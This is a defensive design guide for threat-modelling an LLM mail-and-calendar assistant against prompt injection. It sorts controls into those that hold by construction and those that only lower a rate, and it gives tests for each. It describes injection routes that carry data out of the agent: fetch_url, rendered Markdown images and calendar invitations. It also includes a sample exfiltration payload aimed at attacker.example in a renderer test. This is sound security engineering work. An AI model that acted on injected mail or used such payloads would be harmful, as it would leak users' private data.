## The decision

Which controls ship with an agent, and which residual risks someone signs for in writing. The input is a design; the output is five artefacts in order: a data-flow diagram, a capability table per session, an architecture change, a control per boundary with a label, and a test per control.

The label is the part most threat models leave out. Every control either **holds by construction** (the system cannot take the action, whatever the model emits) or **lowers a rate** (the model is less likely to emit the action). OWASP's 2026 LLM01 entry draws the same line across its 11 mitigations: some reduce injection success and are expected to degrade against adaptive attackers, others bound the blast radius once injection succeeds, and only the second kind survives an attacker who can probe. Nasr and colleagues (October 2025) bypassed 12 published defenses with adaptive attacks, reaching attack success above 90% for most of them, where the original papers had reported near zero. A rate measured against a fixed attack suite is a property of the suite, not of the control.

Construction is not free. CaMeL, a design that separates the control flow of the trusted query from untrusted data and enforces capabilities on the data, reports 77% of AgentDojo tasks solved with provable security against 84% for the undefended agent. That gap is the price of a signable guarantee on that benchmark.

## The inputs that change it

**Who can write into the context.** OWASP 2026 sorts delivery surfaces into untrusted (public web, mail from strangers), semi-trusted (public issue titles, package READMEs) and trusted (your own repositories and mail), and notes that trusted surfaces are fed by low-privilege channels such as a public form or a support ticket. An inbox is untrusted however internal the product is.

**Which capabilities the product needs in one session.** Meta's Agents Rule of Two (31 October 2025) allows at most two of [A] untrustworthy input, [B] sensitive systems or private data, [C] state change or external communication per session. A product that needs all three in one session without a fresh context needs supervision, such as human approval, or it does not ship autonomously.

**Whether a person is present.** Approval works for an interactive assistant. Meta's post says background processes, where a human in the loop is disruptive, are hard to fit to the rule; a nightly triage job has no one to click.

**Which architecture pattern.** CoSAI's AI Incident Response Framework lists components per pattern in its architecture chapter: 6 for a basic LLM application, 8 with memory, 11 for RAG, 10 for an agent and 15 for agentic RAG. Each component is a candidate boundary, so the count predicts the rows of the control table.

## The worked case

The case is hypothetical: an assistant for one user's mail and calendar. Tools: `read_inbox`, `read_calendar`, `create_event` (external attendees receive an invitation), `send_email`, `fetch_url` for links in messages. The chat client renders Markdown. Memory is per conversation only. The product asks for "reply to this for me" and "schedule a call with whoever sent this".

Three edges leave the trust boundary, and only one of them is called "send". `fetch_url` carries data out in the URL it requests. The client fetches any image URL the model writes, which is OWASP LLM01:2025's second example scenario. `create_event` with an external attendee mails an invitation whose body the model wrote.

| Session | A: untrusted input | B: sensitive data | C: state change or outbound | Score |
|---|---|---|---|---|

Under the Rule of Two this row cannot run autonomously; under Willison's trifecta it can be made to send the inbox to an attacker.

### Artefact 3: the architecture change

<div class="tablewrap">

| Session | Holds | Drops | How |
|---|---|---|---|
| Triage [A, B] | read_inbox, read_calendar | C | No send, no create, no fetch; client renders no external images |
| Reader [A, C] | fetch_url | B | Gets one URL, no mailbox, no cookies; output shown to the user only |
| Scheduler [B, C] | read_calendar free/busy, create_event | A | Context is the user's typed request plus typed fields: a contact id from the address book and a date |
| Reply | none autonomous | C becomes the user's | The model writes a draft; the client's Send button calls the mail API from application code |

</div>

Two of Willison's six patterns do the work. The Scheduler is a weak form of the dual LLM pattern: Triage reads the hostile text, and only validated typed values cross to the session that can act. Reply is plan-then-execute with the human as the executor. The typed crossing is a construction control for the type (an attacker cannot smuggle instructions through a contact id that must exist in the address book) and not for the choice (the attacker can still influence which contact). That is a residual risk.

"Reply to this for me" keeps all three properties, because the draft is built from hostile text and goes out, so auto-send becomes supervised: the user presses Send on the exact text.

### Artefact 4: a control per boundary, labelled

CoSAI's agentic mitigation list supplies candidates per component (action permission boundaries, tool sandboxing and execution auditing for the executor; least-privilege configurations for tools; session-bound memory). It does not say which ones hold.

<div class="tablewrap">

| Boundary | Control | Label |
|---|---|---|
| Session tool registry | Each session type's tools are fixed in application code; the dispatcher rejects any other tool name | Construction |
| Client renderer | Content-Security-Policy `img-src 'self'`; renderer drops external image and link targets in model output | Construction |
| Reader egress | Reader runs with no mail credentials; egress proxy denies private address ranges | Construction |
| Scheduler input | Contact id must resolve in the address book; date must parse; nothing else crosses | Construction for the type |
| Ingest and render | Strip tag-block U+E0000 to E007F, variation selectors U+FE00 to FE0F, zero-width U+200B, U+200C, U+200D, U+2060 (OWASP 2026 LLM01 #5) | Construction for those code points only |
| Send button | Approval shows recipients and the exact rendered body | Lowers a rate (approval fatigue) |
| Triage prompt | Mail bodies wrapped and labelled as data (spotlighting) | Lowers a rate |
| Inbound mail | Injection classifier, alerts to the security queue | Lowers a rate; detection |
| Every session | Log identity, model version, prompt and completion, tool calls, session id (CoSAI section 3.2) | Detection, not prevention |

</div>

<Callout kind="gotcha">
A rate control on a boundary that a construction control already closes is a detector, and its alerts are the useful output. A rate control that is the only thing on a boundary is the residual risk, and the document must say so.
</Callout>

Before deciding how much to lean on the rate controls, multiply them out.

### Artefact 5: a test per control

The two labels get different tests.

**Construction controls get deterministic tests that run in CI and must pass every time.** The renderer test feeds `![x](https://attacker.example/?q=secret)` and a reference-style link through the renderer and asserts no external URL survives; a browser test asserts the CSP header on the chat page. The egress test calls the proxy with a private address and a metadata endpoint. The stripping test is property-based: generate strings with code points from the three ranges and assert none reach the rendered output or the context.

```python
# Registry test: the property holds whatever the model emits, so the test never calls a model.
REGISTRY = {
    "triage": {"read_inbox", "read_calendar"},
    "reader": {"fetch_url"},
    "scheduler": {"read_calendar", "create_event"},
}
CATALOGUE = {"read_inbox", "read_calendar", "create_event", "send_email", "fetch_url"}

def dispatch(session_type, tool):
    if tool not in REGISTRY[session_type]:
        raise PermissionError(f"{tool} not registered for {session_type}")
    return "ok"

for session, allowed in REGISTRY.items():
    for tool in CATALOGUE:
        try:
            dispatch(session, tool)
            assert tool in allowed, (session, tool)
        except PermissionError:
            assert tool not in allowed, (session, tool)
assert "send_email" not in set().union(*REGISTRY.values())
print("registry holds")
```

**Rate controls get a measured rate, a threshold and a trend.** The injection suite runs per release against the deployed prompt and model version, and OWASP 2026 LLM01 #11 asks for two numbers: a static baseline (it names AgentDojo and JailbreakBench) and a red-team result with the defence specification disclosed to the testers. The approval control gets a different measurement: the share of approvals made in under some seconds you choose and defend, since an approval faster than reading is not an approval.

### The document that gets signed

Four sections, each with an owner. The diagram and the capability table, as of a date and a model version. The control table with labels. The test list, with the CI job name for each construction test and the dashboard for each rate. The residual risks in plain sentences: "An injected mail can make Triage misreport the inbox to the user; nothing leaves." "An injected mail can influence which contact the Scheduler invites; the invitation body is a template." "Auto-reply depends on the user reading the draft." The reviewer signs the residual risks, not the controls.

## What to measure after deciding

- Construction-test pass rate in CI: 100% or the release blocks.
- Attack success per release on the static suite and on the adaptive red-team round, paired by attack.
- Tool-call attempts rejected by the registry, per session type. Near zero in production; a rise means injections are landing and being absorbed.
- Approval latency distribution and the share of drafts sent unedited.
- Re-review triggers: a new tool, a new data source in any session, a new crossing between sessions, a model change.

## When this is wrong

The Rule of Two counts properties, not magnitudes. A Scheduler that can invite anyone and a Scheduler that can only write the user's own calendar both score C. Magnitude enters in the control table.

Session boundaries hold only if context is really fresh. Memory that persists across sessions, a shared scratch file or a cached summary carries A into every session that reads it; OWASP 2026 treats memory writes as privileged operations for that reason. Long-term memory needs its own row in the capability table, as both a source of untrusted text and a sensitive asset.

The construction label is only as good as the component that enforces it. A CSP that allows a domain which redirects, or a proxy that resolves DNS before checking the address, turns a construction control into a gap with a test suite that still passes. Tests for construction controls should attack the enforcement point, not just exercise it.

Meta's post says the framework is not sufficient for threats other than injection-driven harm: agent mistakes, hallucination, excessive privilege. A mail sent to the wrong person by a confused model is outside this document.
